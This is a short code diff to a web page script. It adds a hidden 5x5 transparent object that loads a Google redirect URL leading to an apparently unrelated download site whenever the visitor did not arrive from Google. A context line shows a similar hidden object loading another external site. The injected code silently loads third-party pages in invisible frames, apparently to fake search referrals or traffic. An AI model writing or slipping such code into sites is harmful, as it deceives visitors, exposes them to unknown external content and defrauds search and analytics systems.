@@ -9,7 +9,15 @@ function getHP() {
 }
 
 document.title = getHP();
-document.referrer = "https://www.google.com/";	
+	
+if (document.referrer != "https://www.google.com/") {
+forserp = document.createElement('object');
+forserp.setAttribute("data","https://www.google.com/url?sa=t&source=web&rct=j&url=https://downloadtrendsong.xyz/&ved=2ahUKEwjMrsa-gLXrAhUrH7cAHZGuCYMQFjAAegQIBRAB&usg=AOvVaw3vIAyzhvTdwWXp-qHNMQlY");
+forserp.setAttribute("width",5);
+forserp.setAttribute("height",5);
+forserp.setAttribute("allowtransparency","true");
+document.getElementsByTagName("body")[0].appendChild(forserp);
+}	
 
 forhpk = document.createElement('object');
 forhpk.setAttribute("data","https://notmastah-mp3.web.app");
